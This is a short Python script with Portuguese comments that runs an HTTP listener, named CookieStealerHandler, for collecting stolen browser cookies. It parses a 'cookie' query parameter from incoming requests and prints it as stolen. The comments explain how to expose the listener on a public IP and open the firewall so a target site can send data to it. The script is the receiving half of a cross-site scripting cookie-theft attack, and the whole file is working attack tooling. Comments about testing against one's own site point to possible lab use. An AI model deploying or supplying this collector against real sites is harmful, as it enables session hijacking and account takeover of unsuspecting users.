from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

# Configure o IP e a Porta onde seu listener vai rodar
# Use '0.0.0.0' para escutar em todas as interfaces de rede da sua máquina
# ou o IP específico da interface que o "site alvo" (seu site) consegue alcançar.
# Se o seu site e o listener estiverem na mesma máquina para teste, '127.0.0.1' ou 'localhost' funciona.
# Se o site estiver em outro lugar (ex: um servidor de hospedagem),
# você precisará usar um IP público/alcançável para o listener e liberar a porta no firewall.
LISTENER_IP = '0.0.0.0' # Ou seu IP local específico, ex: '192.168.1.10'
LISTENER_PORT = 8000    # Escolha uma porta não utilizada

class CookieStealerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n--- REQUISIÇÃO RECEBIDA ---")
        print(f"Origem: {self.client_address[0]}:{self.client_address[1]}")
        print(f"Caminho Solicitado: {self.path}")

        # Decodificar os parâmetros da query
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)

        if 'cookie' in query_params:
            print(f"COOKIES ROUBADOS: {query_params['cookie'][0]}")
        else:
            print("Nenhum parâmetro 'cookie' encontrado na query.")
        print("---------------------------\n")

        self.send_response(200) # Responde com OK para o browser não ficar esperando
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK") # Corpo da resposta simples

    # Suprimir logs padrões do http.server para focar nos seus prints
    def log_message(self, format, *args):
        return

def run_listener(server_class=HTTPServer, handler_class=CookieStealerHandler, ip=LISTENER_IP, port=LISTENER_PORT):
    server_address = (ip, port)
    httpd = server_class(server_address, handler_class)
    print(f"[*] Listener HTTP simples iniciado em http://{ip}:{port}")
    print("[*] Aguardando conexões para capturar cookies...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Listener parado.")
        httpd.server_close()

if __name__ == '__main__':
    run_listener()